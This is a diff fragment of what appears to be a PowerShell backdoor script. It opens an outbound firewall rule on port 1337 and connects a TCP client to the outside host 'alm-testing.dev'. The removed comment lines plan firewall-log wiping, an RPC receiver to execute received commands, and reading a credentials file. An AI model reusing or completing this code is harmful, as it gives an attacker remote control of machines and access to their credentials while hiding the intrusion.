@@ -6,17 +6,6 @@ if (!$(Get-NetFirewallRule -DisplayName "rs1out" 2>$null)) {
 	New-NetFirewallRule -DisplayName "rs1out" -Direction Outbound -LocalPort 1337 -Protocol TCP -Action Allow
 } 
 
-
-
-#TODO: Add firewall log wipes during killed connection.
-#TODO: Add rpc reciever to execute received commands.
-
-
-
-#Format for executing commands with powershell and storing the results
-#$thing = powershell.exe -command "type time-sheet-creds.txt"
-
-
 try {
 	$client = New-Object System.Net.Sockets.TCPClient("alm-testing.dev", 1337);
 	$client.ReceiveTimeout = 5000;
